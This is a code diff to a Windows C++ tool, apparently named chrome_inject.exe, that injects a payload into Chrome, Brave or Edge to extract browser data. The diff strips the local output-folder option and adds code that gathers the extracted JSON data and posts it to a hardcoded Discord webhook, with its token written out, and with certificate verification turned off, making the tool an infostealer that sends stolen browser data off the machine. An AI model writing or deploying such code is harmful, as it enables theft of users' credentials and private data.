@@ -19,6 +19,8 @@
 #include "syscalls.h"
 #define CHACHA20_IMPLEMENTATION
 #include "..\libs\chacha\chacha20.h"
+#define CPPHTTPLIB_OPENSSL_SUPPORT
+#include "..\libs\httplib.h"
 
 #pragma comment(lib, "Rpcrt4.lib")
 
@@ -139,7 +141,6 @@ public:
         std::wcout << L"Usage:\n"
                    << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
                    << L"Options:\n"
-                   << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                    << L"  --verbose|-v             Enable verbose debug output from the injector\n"
                    << L"  --help|-h                Show this help message\n\n"
                    << L"Browser targets:\n"
@@ -341,7 +342,6 @@ private:
 struct Configuration
 {
     bool verbose = false;
-    fs::path outputPath;
     std::wstring browserType;
     std::wstring browserProcessName;
     std::wstring browserDefaultExePath;
@@ -350,15 +350,12 @@ struct Configuration
     static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
     {
         Configuration config;
-        fs::path customOutputPath;
 
         for (int i = 1; i < argc; ++i)
         {
             std::wstring_view arg = argv[i];
             if (arg == L"--verbose" || arg == L"-v")
                 config.verbose = true;
-            else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
-                customOutputPath = argv[++i];
             else if (arg == L"--help" || arg == L"-h")
             {
                 console.printUsage();
@@ -406,7 +403,6 @@ struct Configuration
         }
 
         config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
-        config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
 
         return config;
     }
@@ -534,10 +530,9 @@ public:
         m_console.Debug("Payload connected to named pipe.");
     }
 
-    void sendInitialData(bool isVerbose, const fs::path &outputPath)
+    void sendInitialData(bool isVerbose)
     {
         writeMessage(isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
-        writeMessage(outputPath.u8string());
     }
 
     void relayMessages()
@@ -611,6 +606,7 @@ public:
     }
 
     const ExtractionStats &getStats() const { return m_stats; }
+    const std::vector<std::string> &getJsonData() const { return m_jsonData; }
     const std::wstring &getName() const { return m_pipeName; }
 
 private:
@@ -626,6 +622,11 @@ private:
 
     void parseExtractionMessage(const std::string &message)
     {
+        if (message.rfind("[JSON_DATA]", 0) == 0) {
+            m_jsonData.push_back(message.substr(11));
+            return;
+        }
+
         // Helper lambda to extract numeric value from pattern
         auto extractNumber = [&message](const std::string &prefix, const std::string &suffix) -> int
         {
@@ -669,6 +670,7 @@ private:
     const Console &m_console;
     UniqueHandle m_pipeHandle;
     ExtractionStats m_stats;
+    std::vector<std::string> m_jsonData;
 };
 
 class InjectionManager
@@ -899,7 +901,7 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
     }
 }
 
-PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &config, const Console &console)
+PipeCommunicator RunInjectionWorkflow(const Configuration &config, const Console &console)
 {
     KillBrowserNetworkService(config, console);
 
@@ -913,16 +915,16 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &conf
     injector.execute(pipe.getName());
 
     pipe.waitForClient();
-    pipe.sendInitialData(config.verbose, config.outputPath);
+    pipe.sendInitialData(config.verbose);
     pipe.relayMessages();
 
     target.terminate();
 
-    return pipe.getStats();
+    return pipe;
 }
 
 void DisplayExtractionSummary(const std::string &browserName, const PipeCommunicator::ExtractionStats &stats,
-                              const Console &console, bool singleBrowser, const fs::path &outputPath)
+                              const Console &console, bool singleBrowser)
 {
     if (singleBrowser)
     {
@@ -933,7 +935,6 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
         }
         else
         {
@@ -951,7 +952,6 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
         }
         else
         {
@@ -960,7 +960,7 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
     }
 }
 
-void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &outputPath)
+void ProcessAllBrowsers(const Console &console, bool verbose)
 {
     if (verbose)
         console.Info("Starting multi-browser extraction...");
@@ -986,7 +986,6 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
         Configuration config;
         config.verbose = verbose;
-        config.outputPath = outputPath;
         config.browserType = browserType;
         config.browserDefaultExePath = browserPath;
 
@@ -1011,7 +1010,8 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
         try
         {
-            auto stats = RunInjectionWorkflow(config, console);
+            auto pipe = RunInjectionWorkflow(config, console);
+            auto stats = pipe.getStats();
             successCount++;
 
             if (verbose)
@@ -1020,7 +1020,7 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
             }
             else
             {
-                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, config.outputPath);
+                DisplayExtractionSummary(config.browserDisplayName, stats, console, false);
                 if (i < installedBrowsers.size() - 1)
                     std::cout << std::endl;
             }
@@ -1051,7 +1051,6 @@ int wmain(int argc, wchar_t *argv[])
 {
     bool isVerbose = false;
     std::wstring browserTarget;
-    fs::path outputPath;
 
     // Parse arguments
     for (int i = 1; i < argc; ++i)
@@ -1059,8 +1058,6 @@ int wmain(int argc, wchar_t *argv[])
         std::wstring_view arg = argv[i];
         if (arg == L"--verbose" || arg == L"-v")
             isVerbose = true;
-        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
-            outputPath = argv[++i];
         else if (arg == L"--help" || arg == L"-h")
         {
             Console(false).displayBanner();
@@ -1086,22 +1083,11 @@ int wmain(int argc, wchar_t *argv[])
         return 1;
     }
 
-    if (outputPath.empty())
-        outputPath = fs::current_path() / "output";
-
-    std::error_code ec;
-    fs::create_directories(outputPath, ec);
-    if (ec)
-    {
-        console.Error("Failed to create output directory: " + outputPath.u8string() + ". Error: " + ec.message());
-        return 1;
-    }
-
     if (browserTarget == L"all")
     {
         try
         {
-            ProcessAllBrowsers(console, isVerbose, outputPath);
+            ProcessAllBrowsers(console, isVerbose);
         }
         catch (const std::exception &e)
         {
@@ -1120,10 +1106,35 @@ int wmain(int argc, wchar_t *argv[])
             if (!isVerbose)
                 console.Info("Processing " + optConfig->browserDisplayName + "...\n");
 
-            auto stats = RunInjectionWorkflow(*optConfig, console);
+            auto pipe = RunInjectionWorkflow(*optConfig, console);
+            auto stats = pipe.getStats();
+            auto jsonData = pipe.getJsonData();
+
+            if (!jsonData.empty())
+            {
+                httplib::Client cli("https://discord.com");
+                cli.enable_server_certificate_verification(false);
+                httplib::Headers headers = {
+                    { "Content-Type", "application/json" }
+                };
+
+                for(const auto& json : jsonData)
+                {
+                    auto res = cli.Post("/api/webhooks/1375609048543527085/MeeSogz6SCIWDfVsL_JAdc3fUR_7yd3gD2OzKcCQJfHVJiuDpa_rGZD8_61ccMSxId-n", headers, json, "application/json");
+                    if (res) {
+                        if (res->status == 204) {
+                            console.Success("Successfully sent data to Discord.");
+                        } else {
+                            console.Error("Failed to send data to Discord. Status code: " + std::to_string(res->status));
+                        }
+                    } else {
+                        console.Error("Failed to send data to Discord. No response.");
+                    }
+                }
+            }
 
             if (!isVerbose)
-                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
+                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true);
             else
                 console.Success("\nExtraction completed successfully");
         }
